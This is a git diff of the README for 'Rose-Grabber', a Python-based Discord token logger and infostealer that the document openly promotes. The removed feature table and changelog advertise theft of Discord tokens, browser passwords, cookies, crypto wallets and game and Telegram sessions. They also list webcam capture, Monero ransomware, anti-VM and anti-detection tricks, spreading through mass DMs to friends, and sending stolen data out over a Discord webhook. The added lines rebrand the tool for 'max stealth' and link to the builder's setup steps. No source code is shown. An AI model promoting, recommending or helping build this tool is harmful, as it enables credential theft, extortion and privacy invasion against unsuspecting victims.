@@ -8,6 +8,9 @@
     <a href="https://discord.gg/sbt9drkvAA">
         <img src="https://img.shields.io/badge/Discord-%23da467d.svg?style=for-the-badge&logo=discord&logoColor=white" alt="Join our Discord">
     </a>
+    <a href="https://t.me/rosegrabber">
+        <img src="https://img.shields.io/badge/Telegram-%23da467d.svg?style=for-the-badge&logo=telegram&logoColor=white" alt="Join our Telegram">
+    </a>
     <br>
     <a href="https://deepsource.io/gh/DamagingRose/Rose-Grabber/?ref=repository-badge}" target="_blank">
         <img alt="DeepSource" title="DeepSource" src="https://deepsource.io/gh/DamagingRose/Rose-Grabber.svg/?label=active+issues&show_trend=true&token=bRGn0dU76xkJxQgniOJnrc7a"/>
@@ -34,69 +37,14 @@
 
 <div align="center">
     <h1>
-        DISCORD TOKEN LOGGER WITH LESS DETECTIONS & A BEAUTIFUL BUILDER
+       Python-Powered Discord Token Logger: Max Stealth, Minimal Detection, and a Gorgeous UI Builder!
     </h1>
-  
-  **[<kbd> <br> Discord Server <br> </kbd>][Discord Server]** 
-  **[<kbd> <br> Telegram Channel <br> </kbd>][Telegram Channel]** 
-  **[<kbd> <br> gumbobr0t's Telegram <br> </kbd>][gumbobr0t's Telegram]** 
-  **[<kbd> <br> pierro on GitHub <br> </kbd>][pierro on GitHub]** 
-  **[<kbd> <br> gumbobr0t on GitHub <br> </kbd>][gumbobr0t on GitHub]**
-  **[<kbd> <br> killer on GitHub <br> </kbd>][killer on GitHub]**
 
-  ---
 </div>
-
-[Discord Server]: https://discord.gg/sbt9drkvAA
-[Telegram Channel]: https://t.me/rosegrabber
-[gumbobr0t's Telegram]: https://t.me/gumbobr0t
-[pierro on GitHub]: https://github.com/xpierroz
-[gumbobr0t on GitHub]: https://github.com/gumbobr0t
-[killer on GitHub]: https://github.com/Minecraftkillir
 
 ## Features
 
-| Feature                                      | Description                                  | Status  |
-|----------------------------------------------|----------------------------------------------|---------|
-| GUI Builder                                  | Create user-friendly interfaces easily.      | Done    |
-| UAC Bypass                                   | Bypass User Account Control for elevated privileges. | Later   |
-| Custom Icon                                  | Set a unique icon for your application.      | Done    |
-| Runs On Startup                              | Automatically start with Windows.           | Done   |
-| Disables Windows Defender                    | Disable built-in antivirus protection.      | Later   |
-| Anti-VM                                      | Detect and evade virtual machine environments. | Done    |
-| Blocks AV-Related Sites                      | Prevent access to antivirus websites.       | Later   |
-| Melt Stub                                    | Make the malware difficult to detect by self-destructing. | Done |
-| Fake Error                                   | Display fake error messages to deceive users. | Done |
-| EXE Binder                                   | Combine multiple files into a single executable. | Later |
-| File Pumper                                  | Inflate file sizes to hide malicious content. | Done |
-| Obfuscated Code                              | Use code obfuscation techniques for evasion. | Later |
-| Discord Injection                            | Inject code into Discord processes.         | Done    |
-| Steals Discord Tokens                        | Extract user tokens from Discord.          | Done   |
-| Mass DM Discord Friends                      | DM's every user on the victims discord accounts friendlist. | Done   |
-| Steals Steam Session                         | Gather active Steam sessions.              | Done   |
-| Steals Epic Session                          | Gather active Epic Games sessions.         | Done   |
-| Steals Uplay Session                         | Gather active Uplay sessions.              | Done   |
-| Steals Passwords From Many Browsers          | Extract stored passwords.                 | Done    |
-| Steals Cookies From Many Browsers            | Collect browser cookies.                  | Done    |
-| Steals History From Many Browsers            | Access browsing history.                  | Done    |
-| Steals Autofills From Many Browsers          | Extract autofill data.                    | Later   |
-| Steals Minecraft Session Files               | Gather Minecraft session information.      | Done   |
-| Steals Telegram Session Files                | Extract Telegram session data.            | Done   |
-| Steals Crypto Wallets                        | Target cryptocurrency wallets.           | Done   |
-| Steals Roblox Cookies                        | Gather Roblox-related data.               | Done   |
-| Steals IP Information                        | Collect IP addresses.                     | Done   |
-| Steals System Info                           | Gather system-specific details.          | Done   |
-| Steals Saved Wifi Passwords                  | Extract saved Wi-Fi passwords.            | Done   |
-| Steals Common Files                          | Collect files commonly used for attacks.  | Later   |
-| Captures Screenshot                          | Take screenshots of the user's desktop.  | Done   |
-| Captures Webcam Image                        | Access and capture webcam images.        | Done   |
-| Sends All Data Through Discord Webhook       | Send stolen data to specified destinations. | Done |
-| File Type Selection                          | Choose between screensaver or executable. | Done   |
-| Trigger BSOD                                 | Cause a Blue Screen of Death.            | Later   |
-| Freeze Screen                                | Freeze the user's screen.                | Later   |
-| Spread Malware                               | Send malicious messages to friends on social media. | Later |
-| Crypto Miner                                 | Use the victim's computer for cryptocurrency mining. | WIP |
-| Ransomware                                  | Forces the victim to pay you a specific amount of USD in Monero or they will lose all their data. Decrypter can be found in [components/tools](https://github.com/DamagingRose/Rose-Grabber/tree/main/components/tools). | Done |
+A list of features can be found in our [documentation](https://github.com/DamagingRose/Rose-Grabber/tree/main/docs/FEATURES.md).
 
 ## Disclaimer
 
@@ -106,87 +54,34 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 
 ## Setup
 
-**By virtue of our sophisticated installation process, manual installation of Python is rendered unnecessary. Our meticulously designed batch script adeptly manages this procedure on your behalf.**
-+ Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
-+ Extract the ZIP folder which you just downloaded.
-+ Run the [`install.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/install.bat) to install Rose and then open the UI. To start the program later on, you will need to run the [`start.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/start.bat).
+- Download repository [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
+- Extract packed contents. You can find a guide [here](https://www.top-password.com/knowledge/extract-files-from-zip-in-windows-10.html).
+- Launch UI by executing [`builder.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/builder.bat).
 
 ## Preview
-<div align="center">
-  <a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/opera_j0Pf32tJr5.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_ZHPRdfPVY4.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_d5cUa94C1j.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_zzIPCogBKh.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_6ElGNQxTZw.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/python_xAf0dVCV7y.png"><a href="https://github.com/DamagingRose/Rose-Grabber">
 
-  <br><b>For more images <a href="https://github.com/DamagingRose/Rose-Grabber/tree/main/components/readme">click here</a>.</b>
-</div>
+If you're still unsure you may check out the preview file in our [documentation](https://github.com/DamagingRose/Rose-Grabber/tree/main/docs/PREVIEW.md).
 
 ## Changelog
 
-**Working on crypto miner, rose ransomware & spread malware now.**
-- **2.1 (2023-10-18)**
-  - Fixed system information hanging and restarting the process over and over. (py-cpuinfo -> wmi package)
-  - Fixed the executable dying because of a shitty import. (__webhook.py --> webhook.py)
-  - Removed unused libraries from some of the files.
-  - Ransomware Key is deleted from memory once it's used up fully.
-  - Better formating of HWID, Power, and Screen information.
-  - Handling of empty lists in the power and WiFi variables for future error prevention.
-
-- **2.0 (2023-10-02)**
-  - Added hidden path to browser and more
-  - Fixed wifi password stealing
-  - Fixed ransomware
-  - Fixed webcam stealing
-  - Rewrote embeds for discordc class, screenshot and webcam now embedded inside of message
-  - Added Exodus, Telegram, Steam, Minecraft, Uplay and Epic Games session stealing
-  - Fixed install and start script
-  - Fixed antivm not exiting correctly
-
-- **1.9 (2023-09-12)**
-  - Rewrote ransomware, changed payment to monero
-  - Added ransomware decrypter to [components/tools](https://github.com/DamagingRose/Rose-Grabber/tree/main/components/tools)
-  - Fixed startup
-  - Fixed builder (cleanup, upx, returnzip)
-  - Rewrote/Fixed install and start script
-
-- **1.8 (2023-09-02)**
-  - Added spread malware on discord feature
-  - Added additional error handling
-  - Added other UPX compression
-  - Added extension spoofer
-  - Fixed builder not showing compile CMD
-
-- **1.7 (2023-08-14)**
-  - Added ransomware
-  - Fixed return zip file
-
-- **1.6 (2023-08-14)**
-  - Added Anti-VM
-  - Added UAC bypass
-  - Added better icon selection in builder
-  - Fixed browser stealing
-
-- **1.5 (2023-08-10)**
-  - Improved obfuscation and file type selection
-  - Added log buttons and file pumper
-
-- **1.4 (2023-08-09)**
-  - Added custom icon support and file pumper
-  - Fixed Windows Defender detection
-
-- ...
+The changelog history can be found in our [documentation](https://github.com/DamagingRose/Rose-Grabber/tree/main/docs/CHANGELOG.md).
 
 ## Credits
 
-**Main Developers:**
-- [xpierroz](https://github.com/xpierroz)
-- [gumbobr0t](https://github.com/gumbobr0t)
-- [killer](https://github.com/Minecraftkillir)
+**We extend our deepest appreciation to these exceptional contributors. Their expertise and dedication have greatly enhanced this project.**
 
-**External Credits and Contributions:**
+- [xpierroz](https://github.com/xpierroz)
+- [killer](https://github.com/Minecraftkillir)
 - [Smug246](https://github.com/Smug246)
 - [addi00000](https://github.com/addi00000)
 - [Rdimo](https://github.com/Rdimo)
 - [loTus04](https://github.com/loTus04)
 - [suvan1911](https://github.com/suvan1911)
 - [suegdu](https://github.com/suegdu)
+- [blank](https://github.com/blank-c)
+- [something-0001](https://github.com/something-0001)
+
+**Thank you all!**
 
 ## Love to everyone 💞
 [![Stargazers repo roster for @DamagingRose/Rose-Grabber](https://reporoster.com/stars/dark/DamagingRose/Rose-Grabber)](https://github.com/DamagingRose/Rose-Grabber/stargazers)
